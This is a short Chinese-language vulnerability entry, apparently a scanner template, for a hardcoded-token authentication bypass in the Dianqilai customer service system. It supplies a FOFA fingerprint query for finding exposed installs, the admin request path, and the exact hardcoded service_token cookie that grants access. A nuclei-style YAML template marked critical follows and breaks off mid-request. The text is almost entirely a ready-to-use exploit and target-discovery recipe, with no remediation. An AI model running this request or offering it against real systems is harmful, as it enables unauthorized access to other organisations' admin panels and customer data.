# 点企来客服系统token存在硬编码未授权漏洞

- **系统**：点企来客服系统　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`body="layui-form-item"`
- **请求**：`GET /admin/custom/index.html HTTP/1.1`
- **关键头**：`Cookie: service_token=OuwfoovK%2BIdd`　`X-Requested-With: XMLHttpRequest`
- **预期**：200　|　—

**其他**
- YAML: | id: dianqilai-kfxt-token-unauth<br/>info:<br/>  name: dianqilai-kfxt-token-unauth<br/>  author: AA<br/>  severity: critical<br/>  description: 点企来 客服系统 token 存在硬编码未授权漏洞。<br/>  tags: dianqilai,unauth<br/>  metadata:<br/>    fofa-query: body="layui-form-item" && body="/admin/login/check.html"<br/>http:<br/>  - raw:<br/>      - |<br/>        GET /admin/custom/index.html HTTP/1.1<br/>        Host: <